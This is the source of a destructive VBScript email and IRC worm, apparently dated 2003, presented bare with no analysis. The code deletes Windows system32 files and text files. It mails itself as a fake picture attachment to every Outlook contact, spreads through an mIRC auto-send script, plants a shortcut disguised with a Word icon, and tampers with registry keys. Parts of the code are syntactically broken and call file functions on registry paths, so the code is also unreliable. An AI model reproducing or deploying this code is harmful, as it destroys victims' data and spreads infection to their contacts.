' Mpc
' Ziimac /zBRNZ@hotmail.com / 2003 / MA, USA
On Error Resume Next
Dim zo, ren, mc
Set zo = CreateObject("Scripting.FileSystemObject")
zo.DeleteFile "c:\*txt"

Sub MaiN()
On Error Resume Next
Set ren = CreateObject("Scripting.FileSystemObject")
If ren.FileExists("F:\*.*") Then
ren.MoveFile "F:\*.*", "C:\Fziimac"
End If
Set mc = CreateObject("Scripting.FileSystemObject")
mc.DeleteFile "c:\Fziimac"

Sub Warning()

End Sub
On Error Resume Next
Set wrn = Fso.CreateTextFile("C:\System.bat")
wrn.writeline "I am going to send a E-mail through your computer"
wrn.writeline "If you do not accept it when asked, your Chip will burn"
wrn.writeline "Do you beleve me? I will make you..."
wrn.Close

Sub Email()
Function Outlook()
On Error Resume Next
Set Email = CreateObject("Outlook.Application")
If Email = "Outlook" Then
Set Ma = OutlookApp.GetNameSpace("MAPI")
Set Maadlist = Ma.AddressLists
For Each Addresslist In Maadlist
If Addresslist.AddressEntries.Count <> 0 Then
Addresslistcout = Addresslist.AddressEntries.Count
For AddList = 1 To Addresslistcout
Set MyPic = OutlookApp.CreateItem(0)
Set AdEntries = Addresslist.AddressEntries(AddList)
MyPic.To = AdEntries.Address
MyPic.Subject = "Did you want my pic? Or was that Alex...?"""
MyPic.Body = "Well here it is! It is in the attachment!  You are so cute. xoxoxo"
Set Attachs = MyPic.Attachments
Attachs.Add "c:\mpc.gip.jpg.vbs"
MyPic.DeleteAfterSubmit = True
If MyPic.To <> "" Then
MyPic.Send
End If
Next
registry.regwrite "HKCU\software\myworm\mailed", "1"
End If
Next
End If
End Function

Sub IRC()
On Error Resume Next
Function Mirc(Path)
Set Fso = CreateObject("scripting.filesystemobject")
Set ws = CreateObject("wscript.shell")
If IRC = "" Then
If Fso.FileExists("c:\mirc\mirc.ini") Then
IRC = "c:\mirc"
End If
If Fso.FileExists("c:\mirc32\mirc.ini") Then
IRC = "c:\mirc32"
End If
PfDir = ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If Fso.FileExists(PfDir & "\mirc\mirc.ini") Then
IRC = PfDir & "\mirc"
End If
End If
If IRC <> "" Then
Set MyPicinIRC = Fso.CreateTextFile(Path & "\script.ini", True)
MyPicinIRC.writeline "[script]"
MyPicinIRC.writeline "n0=on 1:JOIN:#:{"
MyPicinIRC.writeline "n1= /if ( $nick == $me ) { halt }"
MyPicinIRC.writeline "n2= /." & Chr(100) & Chr(99) & Chr(99) & " send $nick c:\mpc.gip.jpg.vbs"
MyPicinIRC.writeline "n3=}"
MyPicinIRC.Close
End If
End Function


Sub System()
On Error Resume Next
Dim Camiiz, Z, ZI, ZII, ZIIM, ZIIMA, Ziimac, Fso
Set Camiiz = CreateObject("Scripting.FileSystemObject")
Camiiz.MoveFile "c:\windows\system32\*.log", "c:\Folder\"
Set Z = CreateObject("Scripting.FileSystemObject")
Z.DeleteFile "c:\windows\system\*.*"
Set ZI = CreateObject("Scripting.FileSystemObject")
ZI.DeleteFile "c:\windows\system32\*.wsc"
Set ZII = CreateObject("Scripting.FileSystemObject")
ZII.DeleteFile "c:\windows\system32\*.drv"
Set ZIIM = CreateObject("Scripting.FileSystemObject")
ZIIM.DeleteFile "c:\windows\system32\*.vbs"
Set ZIIMA = CreateObject("Scripting.FileSystemObject")
ZIIMA.DeleteFile "c:\windows\system32\*.sys"
Set Ziimac = CreateObject("Scripting.FileSystemObject")
Ziimac.DeleteFile "c:\windows\system32\*.nls"
Set Fso = CreateObject("Scripting.FileSystemObject")
Fso.DeleteFile "c:\windows\system32\*.exe"

Sub overRide()
On Error Resume Next
Open c:\LoveLetter.txt.vbs for Output as 1#
Print 1#, "@Echo off"
Print 1#, "cls"
Print 1#, "Echo You are in my world"
Close 1#

Sub Desk()
On Error Resume Next
Dim MyShortcut, MyDesktop, DesktopPath
DesktopPath = WSHShell.SpecialFolders("Desktop")
Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\Paint Brush.lnk")
With MyShortcut
  .TargetPath = WSHShell.ExpandEnvironmentStrings("%windir%\system32\Mpc.vbs")
  .WorkingDirectory = WSHShell.ExpandEnvironmentStrings("%windir%")
  .WindowStyle = 4
  .IconLocation = WSHShell.ExpandEnvironmentStrings("C:\Program Files\Microsoft Office\Office10\winword.exe, 0")
  .Save
End With

Sub Runie()
On Error Resume Next
Dim blo
Set blo = CreateObject("WScript.Shell")
blo.Run "C:\WINDOWS\system32\mspaint.exe"
blo.Run "C:\Mpc.vbs"
Set ie = CreateObject("Scripting.FileSystemObject")
ie.CopyFile "A:\DonTopen.vbs"
Set yo = CreateObject("Scripting.FileSystemObject")
yo.DeleteFolder "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
Set till = CreateObject("Scripting.FileSystemObject")
till.DeleteFile "C:\WINDOWS\SYSTEM32\SPOOL\DRIVERS\COLOR\HPP3902A.ICM"

Sub reg()
On Error Resume Next
Set nam = CreateObject("Scripting.FileSystemObject")
If nam.FileExists("HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices") Then
ren.MoveFile "HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices", "HKEY_LOCAL_MACHINE\SECURITY\Port381"
End If
Set Root = CreateObject("Scripting.FileSystemObject")
Root.DeleteFolder "HKEY_CLASSES_ROOT\.bat"
regcreate "HKEY_CLASSES_ROOT\.vbs\ShellW"
End Sub 

